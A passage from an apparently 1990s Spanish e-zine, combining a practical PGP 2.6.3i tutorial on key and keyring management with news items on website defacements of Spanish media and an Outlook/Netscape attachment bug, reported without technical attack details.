que es la firma sola. Para que el resultado sea otro la orden será: pgp -sba carta.txt -o 
cartajh.asc (Ver IX B)
Entre los archivos del directorio \pgp distribuido en la versión 2.6.3I hay uno que es firma 
por separado: pgp263ii.asc. Intenten descifrarlo como ejercicio. Es la firma de pgp263ii.zip.
Como se ve esto de las firmas separadas es un poco complicado y sobre todo no ha sido hasta
 ahora de uso frecuente y por eso se olvida fácilmente cómo funciona. Cada uno verá si le 
invierte tiempo ahora en la práctica de esto, o mejor cuando vea que lo va a necesitar.
I.Manejo de llaveros y de llaves
Ya hemos visto algunas de las funciones del programa que tienen que ver con el manejo de 
llaves y llaveros. Pero hasta ahora hemos estado en el supuesto de que sólo tenemos un 
llavero público, el puring.pgp y uno privado, el secring.pgp. Pero puede ser que queramos 
tener varios llaveros públicos (y quizá varios secretos, lo cual creo que tiene menos 
utilidad y complica mucho las cosas). El o los llaveros públicos contendrán varias o muchas 
llaves. El privado suele tener sólo una, a no ser que hayamos generado varias llaves con 
identificadores y claves (frase-contraseña) distintas, o que compartan varios el mismo 
programa..
Manejar llaveros muy grandes hace todas las operaciones muy lentas. Zimmerman lo dice en el 
documento número 2. Por muy grande piensa en más de un par de cientos. Y no creo que por lo 
pronto queramos tener más. Creo que la utilidad de tener varios llaveros públicos es más 
bien para agrupar las llaves públicas por categorías de personas. En todos los llaveros es 
bueno que esté la propia llave pública. Por vía de ejemplo: yo tengo tres llaveros además del 
pubring.pgp: uno con las llaves que vienen en el archivo keys.asc y que son las de los que 
desarrollan de alguna manera el PGP, otra con las llaves de un grupo de amigos y otro con 
las de un grupo que trabajamos en común , y en mi pubring.pgp he sumado los dos últimos.
Viendo con pgp -h el archivo de ayuda del programa se darán cuenta que muchas veces el llavero 
(en ese archivo es llamado "anillo") viene entre paréntesis cuadrado para denotar que es 
opcional. Si no se escribe en el comando, el programa usará el llavero por omisión (por 
defaul, decimos a veces), que es el pubring.pgp o el secring.pgp según el caso. Y con el 
nombre que esté declarado en el config.txt.
En esa ayuda se habla de fdeclaves (archivo de llaves) y de anillo (llavero). ¿Son lo mismo? 
No exactamente siempre, aunque a veces sí. Los llaveros son un conjunto de llaves con 
terminación pgp y el formato propio de las llaves. A veces un llavero cumple también la 
función de un archivo de llaves. El archivo de llaves puede tener terminación y formato 
.asc; puede tener cualquier otra terminación y estar revuelto con textos. Como cuando nos 
llega en el correo electrónico un mensaje y dentro de él una o varias llaves. O porque
 bajamos del correo todos nuestros mensajes en unsólo archivo y allí se encontrarán textos
 abiertos, textos pegepeados y llaves. En estos casos al descifrar ese archivo el pgp 
dirá si se encuentra una llave. Para las otras funciones de manejo de llaves archivo de 
llaves será un conjunto de llaves en formato .pgp o en formato .asc.
El cuadro que sigue nos dice lo que ya sabemos, aunque viene con información adicional, 
porque puede uno tener varios llaveros públicos e incluso varios secretos
Generar nuestro par de llaves pública-privada	pgp -kg
El resultado son pubring.pgp, secring.pgp y randseed.bin (Luego veremos para qué es este 
archivo)	
Añadir llaves nuevas a un llavero.
Al generar tu par de llaves te resultó un par de llaveros de una llave cada uno: pubring.pgp 
y secring.pgp	pgp -ka archivo_origen [llavero_destino]
Si no se escribe el llavero_destino va al defaul, que es pubring.pgp, o el que se haya 
indicado en el config.txt, o el secring.pgp según que el contenido del archivo_origen tenga
 por contenido llaves públicas o privadas.	
Meter nuestro llavero público, con una o con muchas llaves, a una armadura de ASCIIs simples 
con la que es capaz de sobrevivir en el medio inhóspito de las máquinas de 7 bits. 	
pgp -a pubring.pgp
El resultado será pubring.asc, que no es llavero, sino archivo de llaves. Es la colección 
de llaves en formato .asc, pero no funciona como llavero.	
Sacar copia de cualquier llave que esté en nuestro llavero público (e igual se hace con el 
privado o secreto) y conservarla en un archivo cuyo contenido es sólo una llave. 	
pgp -kx ident archivo_destino.pgp llavero_origen. 
O bien: pgp -kxa ident archivo_destino.asc llavero_origen	
Examinar cualquier llavero para saber de qué llaves consta. La segunda "v" opcional se 
usa para ver también qué firmas tiene cada llave (v=verbose). Si no se escribe ningún ident 
se verán todas. 	pgp -kv[v] [identif] [llavero]	
Suprimir una llave o sólo un identificador, de un llavero	pgp -kr ident [llavero]	
Añadir un identificador o modificar la clave en el llavero privado	pgp -ke ident 
[llavero]	
Firmar la llave de un llavero público	pgp -ks ident [-u propio_ident] [llavero]
El parámetro -u propio_ident sirve para cuando en el mismo llavero privado hay varias llaves. 
O porque uno mismo se ha generado varias llaves, o porque dos o más comparten el mismo llavero 
secreto, cada uno con su llave.	
Y siguen más funciones de manejo de llaves y llaveros que no han salido todavía en esta guía:
Examinar la huella digital de las llaves	pgp -kvc [ident] [llavero]	
Modificar el valor de mi firma en la llave de otro, presente en un llavero público mío.	
pgp -ke ident [llavero]	
Desactivar (o activar si estaba desactivada) una llave pública.	pgp -kd ident [llavero]	
Suprimir una o más firmas de una llave. 	Pgp -krs ident [llavero]	
Revocar una llave propia.
Esto no lo he hecho nunca. Se emite un certificado de revocación. No sé si al mismo tiempo 
queda desactivada para siempre la propia llave.	Pgp -kd mi_ident	
Tomo (no a la letra):del archivo  pgpdoc1.txt
Revocar una llave pública
Supongamos que tu llave secreta y tu clave (frase contraseña) ya están en manos de otros. 
Hay que avisar a todo el mundo para que dejen de usar esa llave pública tuya. Para esto se 
expide un certificado de revocación. Se obtiene esto con:
		pgp -kd tu_ident
Este certificado lleva tu firma hecha con la misma llave que estás revocando. Deberás 
distribuir ampliamente el certificado de revocación lo antes posible. Quienes lo reciban 
lo podrán añadir a sus llaveros públicos y su PGP impedirá que se use esa llave si es que 
por error la quieres usar. Te tocará generar un nuevo par de llaves y volver a difundir tu 
nueva llave pública.
Y puede ser que quieras revocar tu llave por alguna otra razón. Pero el procedimiento es el 
mismo.
Casos  conocidos:: robo de la computadora, olvido de la frase clave que abre tu llave 
secreta...
I.Complementos
Quedan aún algunos temas por tratar que si se hubieran explicado junto con los anteriores, 
quizá hubieran complicado de más cada tema. Sin embargo, precisamente porque queremos 
ayudarnos todos en esto, vuelvo a pedir sus sugerencias para mejorar las explicaciones
 o el orden, o todo lo que les parezca que ayuda a que otros se animen y usen el PGP.
A.El parámetro -p
Al descifrar un archivo es posible restablecer el nombre original del archivo. No lo he 
usado porque es fácil que varios le den el mismo nombre, por ejemplo, juan.txt (porque 
le escriben a Juan Hernández). Y como se puede determinar el nombre resultante como uno 
quiera con el parámtero -o prefiero escogerlo yo.
A.El parámetro -o
Con el parámetro -o señala uno el nombre resultante, o sea el nombre del archivo descifrado. 
Si no se usa ni el -o ni el -p el archivo resultante es, como ya hemos visto, el mismo nombre 
del que se descifra sin ninguna terminación. El parámetro -o también sirve para dar un nombre
 con todo y ruta (path) y así cae lo descifrado en el directorio que uno quiere.
Supongamos que quiero tener lo que voy recibiendo en un directorio que se llama \cartas\Juan 
y Juan me manda una carta cifrada carta.asc; entonces con el comando:
pgp -o c:\cartas\juan\c960717.txt
el archivo descifrado será c960717.txt en el subdirectorio \cartas\juan. Se supone que el 
subdirectorio \juan ya existe en mi compu.
A.El parámetro -u
Si hay sólo una llave en el llavero privado (secreto) el parámetro -u no es necesario. Si
 varios comparten un mismo llavero privado y por tanto hay en él varias llaves, con el 
parámetro -u se le indica al programa cuál de esas llaves debe usar para firmar archivos o 
llaves.
A.El número hexadecimal de la llave como identificador
Se puede usar como identificador el número hexadecimal de la llave precedido por el prefijo 
0x (cero x). Así, mi identificador puede ser 0xAF32327D; el de fulano, 0x3E66DFD1. El comando:
pgp -e archivo.??? 0xaf32327d 0x3e66dfd1
cifrará archivo.??? para fulano y para mí.
Cuando examinamos con -kv un llavero vemos el número hexadecimal de la(s) llave(s).
Esta es la manera de evitar ambigüedades cuando varios tienen identificadores iguales. El caso 
extremo será si alguno ha generado dos pares de llaves con el mismo identificador pues es la
 misma persona. Pero el número hexadecimal de cada par de llaves es distinto.
Una observación a propósito de los identificadores. PGP maneja como identificador cualquier
 palabra o parte de ella que esté en el nombre de la llave. Mi llave es: pub   512/AF32327D
 1994/07/15 Luis del Valle <lvalle@mixcoac.uia.mx>. Pueden ser identificadores las palabras 
completas: luis del valle lvalle mixcoac.uia.mx, o cualquier parte de ellas. Y por eso 
fácilmente se pueden dar ambigüedades. También puede ser identificador cualquier combinación 
de letras y espacios de mi nombre si se escriben entre comillas: "luis del" "is de" "lv", o 
también el número hexadecimal de mi llave, o todo o una parte de él, precedido por el prefijo
 0x. 0xaf32327d, 0xaf32, 0x327d identifican mi llave, aunque si no se escribe todo el número
 puede identificar otras llaves también. La manera de ver si varias llaves coinciden en el 
mismo identificador es viendo el contenido de un llavero con la orden pgp -kv ident [llavero]. 
Resultarán todas las llaves que tengan ese identificador. Si sólo resulta una, no hay 
ambigüedad en ese identificador.
A.El archivo randseed.bin
Cada vez que PGP cifra algo genera primero la clave para ello. Es un número construido
 con un número de tantos bits cuantos tiene la llave. Con esa clave cifra el archivo. 
Luego cifra la clave recién generada con ayuda de la llave pública del destinatario. Al 
descifrar, PGP descifra primero la clave de todo lo demás del archivo y con ella como 
instrumento descifra el archivo mismo. Randseed.bin es un archivo que utiliza PGP para 
generar al azar el número que será la clave de lo que esté cifrando en ese momento.
A.Archivos por cifrar en otros directorios que no son \PGP
Sin duda que ya han cifrado archivos que no estén en el directorio \PGP. No es tema éste 
directamente del uso de este programa, sino del uso general del DOS. Dado que el directorio 
\PGP está en la ruta (path) en el comando path del autoexec.bat, se puede invocar el comando 
pgp desde cualquier directorio.
También se puede cifrar cualquier archivo que esté en cualquier directorio si estando en el 
directorio PGP se da el nombre del archivo con todo y su ruta. Por ejemplo:
c:\pgp> pgp -esa c:\doc\cartas\fulano.txt ident
cifra el archivo fulano.txt que está en el subdirectorio cartas del subdirectorio doc del 
directorio principal. Con el parámetro -o pedimos que el resultado tenga el nombre que
 queramos en el directorio que deseemos.
c:\pgp> pgp -esa c:\doc\cartas\fulano.txt ident -o c:\modem\subir\fulano.asc
pone el mensaje cifrado en el subdirectorio subir del subdirectorio modem del directorio 
principal.
I.Frentes para PGP en DOS y en windows
Tan sólo aludo a que existen programas que manejan más amigablemente, como dicen, el PGP. 
No es que se haya hecho el programa de esa otra manera, sino que son presentaciones por medio
 de menús, o desde windows y que se encargan da ir a DOS y dar los comandos con los parámetros
 correspondientes. Mi experiencia ha sido que facilitan el manejo, pero sólo de las 
principales funciones. Por otra parte son las más ordinarias.
Se pueden conseguir por ftp o en la página web del pgp. No entro a explicarlos porque sería, 
creo, una tarea semejante a la que asumí con este instructivo.
Órdenes para PGP 2.6.3(i)
(a_normal = archivo normal; adellaves = archivo de llaves,...)
Para cifrar un archivo normal con la llave pública del destinatario:
	pgp -e a_normal identificador [otros identificadores]
Para firmar un archivo normal con mi llave secreta:
	pgp -s a_normal [-u mi_identificador]
Para firmar un archivo normal con mi llave secreta y después cifrararlo con la llave pública 
del destinatario:
	pgp -es a_normal identificador [otros id.]  [-u mi_identificador] 
Para cifrar un archivo normal sólo a la manera tradicional:
	pgp -c a_normal
Para descifrar un archivo, o comprobar la integridad de la firma en un archivo firmado:
	pgp acifrado [-o a_normal]
Para descifrar un archivo con armadura ASCII en varias partes: grabe todas las partes por
 orden en un archivo con extensión .asc y escriba:
	pgp farmadura [-o a_normal]
Funciones para la gestión de llaves:
Para generar tu propio par único de llaves pública/secreta:
	pgp -kg
Para añadir el contenido de un archivo de llaves públicas o secretas al llavero 
correspondiente:
	pgp -ka adllaves{origen} [llavero{dest}]
Para extraer (copiar) una llave del llavero de llaves públicas o secretas:
	pgp -kx identificador adllaves [llavero]
o:	pgp -kxa identificador adllaves {destino} [llavero{origen}]
Para visualizar el contenido del llavero de llaves públicas:
	pgp -kv[v] [identificador] [llavero]

Para ver la huella digital de una llave pública, y poder verificarla por 
teléfono con su dueño:
	pgp -kvc [identificador] [llavero]

Para visualizar el contenido y comprobar las firmas de certificación en el llavero de 
llaves públicas:
	pgp -kc [identificador] [llavero]

Para modificar el identificador o la frase de contraseña (clave) de la llave secreta:
	pgp -ke identificador [llavero]

Para modificar los parámetros de confianza de una llave pública:
	pgp -ke identificador [llavero]

Para suprimir una llave, o sólo un identificador, del llavero de llaves públicas:
	pgp -kr identificador [llavero]

Para firmar la llave pública de alguien en el propio llavero de llaves públicas:
	pgp -ks identificador_des 
[-u su_identificador] [llavero]

Para suprimir de un llavero ciertas firmas de un usuario:
	pgp -krs identificador [llavero]

Para desactivar una llave pública, para que PGP no la utilice, o para reactivarla:
	pgp -kd identificador [llavero]

Para revocar permanentemente su propia llave, emitiendo un certificado de compromiso de llave:
	pgp -kd su_identificador

Ordenes esotéricas:
Para descifrar un mensaje y dejar su firma intacta:
	pgp -d acifrado

Para crear un certificado de firma separado del documento:
	pgp -sb atexto [-u mi_identificador]

Para separar un certificado de firma del mensaje firmado:
	pgp -b acifrado


Opciones que pueden utilizarse en combinación con otras:

Para producir un archivo cifrado en formato ASCII radix-64, añada simplemente la opción -a 
cuando cifre o firme un mensaje, o cuando extraiga una llave:
	pgp -sea ftexto identificador_des
o:	pgp -kax identificador fdllave [llavero]

Para eliminar automáticamente el archivo normal después de crear el archivo cifrado, añada 
simplemente la opción -w (wipe {limpiar}) 
cuando cifre o firme un mensaje:
	pgp -wes mensaje.txt identificador [otros ident.]

Para indicar que un archivo normal contiene texto ASCII, no binario, y que debe ajustarse a 
los convenios de línea del destinatario, añada la opción -t (texto) a las otras opciones:
	pgp -seta mensaje.txt identificador [otros ident.]

Para visualizar el texto descifrado en la pantalla (como con la orden "more" {más} de Unix), 
sin grabarlo en un archivo, utilice la opción -m (more) al descifrar:
	pgp -m acifrado

Para indicar que el texto descifrado para el destinatario SÓLO se puede mostrar en la pantalla
 de éste, sin grabarse en el disco, añada la opción -m:
	pgp -metas mensaje.txt identificador [otros identificadores]

Para recuperar el nombre original del archivo normal al descifrar, añada la opción -p:
	pgp -p acifrado

Para utilizar en modo filtro, como en Unix, leyendo de la entrada estándar y escribiendo en la 
salida estándar, añada la opción -f:
	pgp -festa identificador [otros identificadores]< aentrada > asalida

Para incluir identificadores de un archivo al cifrar un mensaje, utiliza la opción -@:
	pgp -e archivo un_identificador 
	-@masids.txt
NOTA: Aunque no esté en la documentación, también me ha resultado con:
	pgp -e archivo -@identificadores.txt

Como identificador se puede usar el número de cualquier llave (el que sale al ver un llavero, 
no la huella digital) precedido de 0x (cero, x), por ejemplo 0xAF323227D, o sólo parte de ese 
número. Cuidar que no haya ambigüedad. Se comprueba viendo el llavero con el identificador 
(pgp -kv identificador llavero) y comprobar que sólo resulta uno. A no ser que uno quiera 
cifrar para los varios que resulten.

Revisado el escrito noto que no traté lo que se dice del modo de filtro al estilo unix.
Órdenes para PGP 2.6.3i
Cifrar a la manera tradicional:
pgp -c[a][m][w] archivo.??? [-o ruta\archivo.???]
Opciones: 
[a] armadura de ASCIIs, 
[m] Sólo lectura en pantalla sin que lo puedan grabar.
[w] Que se borre el archivo original no cifrado
[o ruta\archivo.???] Darle nombre con todo y ruta al archivo resultante
Resulta: archivo.asc ó archivo.pgp ó ruta\archivo.???
Cifrar al modo del pgp
pgp -e[s][a][m][w]  archivo.???  Ident [ident] [ident] [...][-o ruta\archivo.asc] [-u tu_ident],
o bien: pgp -e[s][a][m][w] archivo.??? -@llaves.txt [-o ruta\archivo.asc] [-u tu_ident],
Opciones:
[s] firmar
[a] armadura de ASCIIs
[m] Solo lectura sin que lo puedan grabar
[w] Que se borre el archivo original no cifrado
[-o ruta\archivo.???] Darle nombre con todo y ruta al archivo resultante.
[-u tu_identi] se debe usar si firmas lo cifrado y tienes en tu secring.pgp varias llaves.
Llaves.txt es un archivo de texto con los identificadores de aquellos para quien se cifra. Un
 identificador en cada renglon. Pueden ir espacios y sin comillas.
Resulta: archivo.asc ó archivo.pgp ó ruta\archivo.???
Firmar un texto abierto (se puede firmar también cualquier archivo, con cualquier terminación):
pgp -st[a][b] archivo.txt
Opciones:
[a] armadura de ASCIIs
[b[ producir la firma en archivo separado
Resulta: archivo.asc ó archivo.pgp
Descifrar:
pgp -[m][p] archivo.??? [-o ruta\archivo.???]
Opciones:
[m] Sólo lectura, sin que se grabe el archivo descifrado en mi disco.
[p] El resultado tendrá el nombre original del archivo que se cifró.
[-o ruta\archivo.???] Dará nombre con todo y ruta al archivo que resulte
Observaciones:
PGP va distinguiendo qué tipo de archivos está descifrando.
una o varias llaves. Preguntará si las añade al llavero pubring.pgp.
un texto cifrado a  la manera tradicional. Pedirá la frase-clave con que se cifró.
un texto cifrado la manera del pgp. Dirá si está firmado y luego lo descifrará.
una firma separada del texto. Dirá que necesita el nombre del archivo a que se refiere y luego 
checará la integridad del documento.
un texto abierto pero firmado. Checará la firma.
Resultados diversos.
Recuérdese que el config.txt puede hacer que las opciones [a][t] estén activadas siempre que 
sea posible aunque no se escriban expresamente en la línea de comando.
1)MANEJAR LLAVES
· Generar nuestro par de llaves pública-privada
pgp -kg
El resultado son pubring.pgp, secring.pgp y randseed.bin
· Añadir llaves nuevas a un llavero:
pgp -ka archivo_origen [llavero_destino]
Si no se escribe el llavero_destino va al defaul, que es pubring.pgp, o el que se haya 
indicado en el config.txt, o el secring.pgp según que el contenido del archivo_origen tenga
 por contenido llaves públicas o privadas
· Meter nuestro llavero público, con una o con muchas llaves, a una armadura de ASCIIs simples
 con la que es capaz de sobrevivir en el medio inhóspito de las máquinas de 7 bits.
pgp -a pubring.pgp
El resultado será  pubring.asc, que no es llavero, sino archivo de llaves. Es la colección 
de llaves en formato .asc, pero no funciona como llavero.
· Sacar copia de cualquier llave que esté en nuestro llavero público (e igual se hace con el 
llavero privado o secreto) y conservarla en un archivo cuyo contenido es sólo una llave.
pgp -kx ident archivo_destino.pgp llavero_origen
pgp -kxa ident archivo_destino.asc llavero_origen
· Examinar cualquier llavero para saber de qué llaves consta. La segunda "v" opcional se usa 
para ver también qué firmas tiene cada llave (v=verbose). Si no se escribe ningún ident se 
verán todas.
pgp -kv[v] [identif] [llavero]
· Suprimir una llave o sólo un identificador, de un llavero
pgp -kr ident [llavero]
· Añadir un identificador o modificar la clave en el llavero privado
pgp -ke ident [llavero]
· Firmar la llave de un llavero público
pgp -ks ident [-u propio_ident] [llavero]
El parámetro -u propio_ident sirve para cuando en el mismo llavero privado hay varias llaves. 
O porque uno mismo se ha generado varias llaves, o porque dos o más comparten el mismo llavero 
secreto, cada uno con su llave.
· Examinar la huella digital de las llaves
pgp -kvc [ident] [llavero]
· Modificar el valor de mi firma en la llave de otro, presente en un llavero público mío.
pgp -ke ident [llavero]
· Suprimir una o más firmas de una llave.
pgp -krs ident [llavero]
· Desactivar (o activar si estaba desactivada) una llave pública.
pgp -kd ident [llavero]
· Revocar una llave propia.
pgp -kd mi_ident
Se emite un certificado de revocación. Este certificado, incluido en un llavero público, 
impide que se use la llave revocada. Esto no lo he hecho nunca. No sé si al mismo tiempo queda
 desactivada para siempre la propia llave.
///////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

12.             NOTICIAS DE LA RED

ZeD no se hace responsable de las opiniones a qui reflejadas y puede o no compartir la misma
opinion que los autores de estas noticias.

Mikel Amigot

 Agitado día el de ayer para el equipo de La Brújula. Un "hacker" con el pseudónimo "R2D2" 
entró a primera hora de la mañana en el apartado de noticias de "Informativos Imssa-La Brújula"
 de "Ethek and Friends", http://www.ethek.com , estampó su firma, pintó unos cuernos en la foto
 de este cronista y dejó un par de direcciones a sitios pornográficos. 
El propietario de Ethek, Enric, asociado y gran amigo de nuestro diario, permite desde hace 
meses el acceso a directorios de su web a diversos colaboradores, que actualizan directamente
 sus páginas. "R2D2" aprovechó un descuido en la configuración de las extensiones de "Front 
Page" y penetró en el servidor web que aloja tanto las páginas de Ethek como La Brújula y 
otros "sites". El hacker entró dos veces y anunció que su próximo objetivo serían las páginas
 nuestro periódico. 
La "travesura" amenazaba con ir a mayores, de modo que hubimos de movilizar al equipo de
 programación, desperdigado por España aprovechando la parálisis agosteña. Imagínense la 
escena: quien suscribe con un teléfono móvil frente al mar en Zarautz, Gipuzkoa, en plan 
"ciberhortera", y el resto del equipo, más serio, frente a diversos ordenadores, tratando
 de evitar un nuevo ataque y localizando al hacker, o grupo de hackers, que anunciaban el 
asalto. David y Alberto, en Madrid, frente al NT; Enric, en Casteldefells analizando los 
"logs"; Angel, en la Diagonal barcelonesa, sugiriendo "sorpresas" para los intrusos; y
 Alberto, en Gijón, dando nuevas pautas. 
¿Qué sucedió? No conviene presumir y los cánones periodísticos indican que uno no debe hablar
 de sí mismo, pero con este equipo el resultado estaba cantado: no consiguieron entrar y, 
además, a punto estuvimos de descubrir la identidad del intruso (Hoy seguramente caerá). 
LABRUJULA.NET permaneció inexpugnable. "R2D2", que utilizó también el alias de "Kicktophone", 
se quedó sin la satisfacción de anunciar en las "news" nuevas hazañas. Luego surgieron 
inevitablemente las especulaciones de quién o quiénes podían ser. Personas molestas por 
nuestras informaciones, desde luego, no faltan, pero repasando la hemeroteca dedujimos que 
este grupo de "agraviados" era incapaz de manejar ordenadores con habilidad. Así que nos
 inclinamos por la tesis de la travesura. Hemos alcanzado una cierta notoriedad 
(ayer superábamos la barrera de los 10.000 suscriptores diarios en menos de cinco 
meses de existencia) y "hackear" La Brújula empieza a ser noticia. Al menos para nosotros
 lo es. Y esperemos que también para usted, querido lector. :-)
////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Mikel Amigot

 Los "hackers" que asalten un medio de comunicación o una empresa española o 
hispanoamericana deberían dejar, además de una firma del tipo "web hackeado por X", un 
enlace a una página con un pequeño manual sobre términos básicos de Internet, de la 
filosofía del "hacking" y de la vida informática en general. De no hacerlo así, corren 
el peligro de que las empresas a las que han accedido no se enteren de nada. 
El sábado pasado cuando este cronista llamó a EuropaPress para preguntar por el alcance
 del ataque del que había sido víctima esta agencia de noticias, un redactor jefe, que 
actuaba como director en funciones, preguntó qué era eso de "ser hackeado" y "para qué 
servía". Alguien de su compañía debió de comprenderlo, pues al cabo de una hora el sitio 
web quedaba restaurado. El grupo "Digit0", que firmaba la intrusión en el sistema de "Europa 
Press" y aparecía por primera vez en escena, debería adjuntar en adelante un diccionario 
básico. 
Este desconocimiento imperante recuerda a la fisura de seguridad del "::$DATA", que
 permitía bajar los "códigos fuente" de los programas realizados en "asp" o "perl" en 
servidores NT. Todavía hoy, semanas después de ser descubierto el agujero, muchos sistemas 
de empresas no han instalado el pertinente parche de seguridad. Otro fallo elemental muy 
extendido se produce cuando no se aplica ningún tipo de privilegio de acceso a las páginas 
web diseñadas con Front Page. En algunos casos llamando simplemente al sistema se logra 
entrar. Tantas facilidades, unidas al desconocimiento existente, están propiciando que el
 "hacking", tan mitificado en otros países, se esté convirtiendo en nuestro entorno en una 
práctica excitante a la que cualquiera puede acceder.
/////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Microsoft y Netscape estudian soluciones urgentes para evitar la fisura del “e-mail”

Lunes, 3 Agosto
 Dos investigadores de la Universidad finlandesa de Oulu, Ari Takanen y Marko Laakso, han 
descubierto un fallo de programación en los programas gestores de correo electrónico de 
Netscape y Outlook de Microsoft, que permitirían a intrusos informáticos con malas 
intenciones destruir o robar documentos e insertar diferentes virus en nuestro ordenador. 
Tanto Netscape como Microsoft han confirmado el hecho y han empezado a elaborar contrareloj 
“parches” o programas que corrijan el defecto.
El defecto o “bug” se produce sin necesidad de abrir el mensaje, lo cual ha disparado la 
alarma en la comunidad de Internet, pues hace revivir un viejo fantasma que asoló la red 
en los primeros años, cuando se pensó que la recepción de un simple mensaje de correo 
electrónico podría servir para que alguien entrara en nuestro ordenador. Algunos 
desaprensivos se encargaron a lo largo de los últimos años de mantener vivo el temor, 
lanzando falsas ideas del tipo de “si usted abre un mensaje que lleve por título
 “Win a holiday” o “Good times” infectará automáticamente su máquina”.
La noticia hoy es que existe la posibilidad de que simplemente recibiendo un 
correo con un archivo adjunto, uno puede perder el control del propio ordenador.
 Cuando el fichero adjunto lleva un nombre extremadamente largo, con una extensión 
superior a la que admite el sistema, el programa lector de correo se queda “colgado”.
 Pero antes de ello, al parecer, se ejecuta el fichero en cuestión, que puede consistir
 en un virus o, por poner otro ejemplo, en un programa para copiar el contenido del disco
 duro y enviarlo por la red. Uno de los mayores expertos en seguridad en España, José Manuel 
Gómez, coordinador del sitio web Kriptópolis, http://www.kriptopolis.com, en el que se da
 una amplia información del tema, ha asegurado en su boletín que “los usuarios están ahora
 desprotegidos y, dada la implantación de los programas de correo, tenemos al diablo
 sentado en la mesa”.
Sin embargo, a pesar de la convulsión, el modo concreto de explotar este “bug” aún no ha 
sido difundido. Tampoco han trascendido noticias de ataques. Netscape ha señalado que en los 
próximos días difundirá una versión que evite el problema, mientras Microsoft ha recomendado
 que no se lean los mensajes con ficheros adjuntos de comunicantes desconocidos. Netscape ha
 pedido que “bajo ninguna circunstancia se active el menú de Archivo cuando el mensaje esté 
seleccionado”. Ambos fabricantes de software sugieren visitas periódicas a sus páginas 
dedicadas a seguridad, pues tan pronto tengan el “antídoto” lo difundirán.
La fuerte competencia entre los navegadores ha llevado a ambas firmas rivales a comercializar 
software con errores tan graves como éstos, según coinciden diversos programadores consultados
 por nuestro diario. Como fuente de información adicional, se recomienda News.com, así como el
 foro más prestigioso de la red en cuestiones de “bugs” y errores de programación: 
http://www.ntbugtraq.com
///////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Un grupo de “hackers” españoles entra el servidor web de la agencia “Europa Press” 
Domingo, 9 Agosto
 El servidor web de “Europa Press”, la segunda agencia de noticias españolas después de “Efe” 
ha sido asaltado hoy sábado 8 por un grupo de “hackers” españoles denominado “Digit0”, 
quienes comunicaron la acción a LABRUJULA.NET . Los hackers dejaron una señal de su 
incursión en la página web de “Europa Press”,<HTTP: www.europapress.es 
http://www.europapress.es . Escribieron la frase: “La seguridad es sólo 
un estado mental”; y manifestaron su protesta contra las subidas telefónicas:
 “El día 3 todos contra el abuso”, con un enlace al sitio web 
http://www.lanzadera.com/lahuelga , en el que se manifiesta la disconformidad con el
 incremento de las tarifas. Europa Press es el primer medio de comunicación español 
que resulta “hackeado”. 

Al comprobar que después de varias horas la agencia no restauraba la versión original de sus 
páginas web, el editor de LABRUJULA.NET estableció contacto telefónico con este medio para 
averiguar el alcance del ataque y se encontró con la sorpresa de que ningún responsable del 
medio se había percatado de la acción. Un redactor jefe, que actuaba como máximo responsable
 en ausencia del director, señaló que “era la primera noticia que tenían” y preguntó, 
extrañado, “para qué se hacía esto”. 

Una hora después de recibir nuestra comunicación, los responsables de informática de 
“Europa Press” cambiaron la página principal, sin que hasta el momento se haya sabido
 la magnitud de la acción. LABRUJULA.NET tuvo noticia del ataque informático por un 
“e-mail” que llevaba el encabezamiento de “Hackeada la Web de la agencia Europa Press”. 
Esta agencia de noticias es uno de los medios históricos en el suministro de información 
en España. Presta servicios a decenas de periódicos y revistas. En Internet realiza desde 
hace casi dos años un servicio de noticias para “Telefónica”, y en este año ha firmado un 
acuerdo con el buscador “Olé” para difundir informaciones de agencia. 
/////////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
NOTICIAS DE LA SEMANA	

Un grupo de “hackers” españoles entra el servidor web de la agencia “Europa Press” 
Domingo, 9 Agosto
 El servidor web de “Europa Press”, la segunda agencia de noticias españolas después de 
“Efe” ha sido asaltado hoy sábado 8 por un grupo de “hackers” españoles denominado “Digit0”,
 quienes comunicaron la acción a LABRUJULA.NET . Los hackers dejaron una señal de su incursión
 en la página web de “Europa Press”,<HTTP: www.europapress.es http://www.europapress.es . 
Escribieron la frase: “La seguridad es sólo un estado mental”; y manifestaron su protesta 
contra las subidas telefónicas: “El día 3 todos contra el abuso”, con un enlace al sitio 
web http://www.lanzadera.com/lahuelga , en el que se manifiesta la disconformidad con el
 incremento de las tarifas. Europa Press es el primer medio de comunicación español que 
resulta “hackeado”. 

Al comprobar que después de varias horas la agencia no restauraba la versión original 
de sus páginas web, el editor de LABRUJULA.NET estableció contacto telefónico con este
 medio para averiguar el alcance del ataque y se encontró con la sorpresa de que ningún
 responsable del medio se había percatado de la acción. Un redactor jefe, que actuaba como
 máximo responsable en ausencia del director, señaló que “era la primera noticia que tenían”
 y preguntó, extrañado, “para qué se hacía esto”. 

Una hora después de recibir nuestra comunicación, los responsables de informática de
 “Europa Press” cambiaron la página principal, sin que hasta el momento se haya sabido
 la magnitud de la acción. LABRUJULA.NET tuvo noticia del ataque informático por un
 “e-mail” que llevaba el encabezamiento de “Hackeada la Web de la agencia Europa Press”.
 Esta agencia de noticias es uno de los medios históricos en el suministro de información
 en España. Presta servicios a decenas de periódicos y revistas. En Internet realiza desde 
hace casi dos años un servicio de noticias para “Telefónica”, y en este año ha firmado un 
acuerdo con el buscador “Olé” para difundir informaciones de agencia. 
	

Una empresa de León negocia con Telefónica dar tarifa plana en septiembre 
Domingo, 9 Agosto
 Una empresa privada de León, NoraCentrex<HTTP: www.nora.es , formada por informáticos y
